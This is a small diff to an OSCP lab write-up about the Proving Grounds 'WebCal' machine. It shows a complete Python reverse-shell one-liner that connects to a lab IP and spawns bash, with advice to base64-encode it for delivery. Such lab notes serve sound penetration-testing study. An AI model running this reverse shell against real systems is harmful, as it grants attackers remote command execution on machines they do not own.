@@ -84,7 +84,7 @@ Now we can confirm that the exploit works and then try to send the reverse shell
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h15m13s_004_.png)
 
-I use the python command below to successfully get the connection. Convert the code to base64 format before sending.
+Use the python command below to successfully get the connection. Convert the code to base64 format before sending.
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.191",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
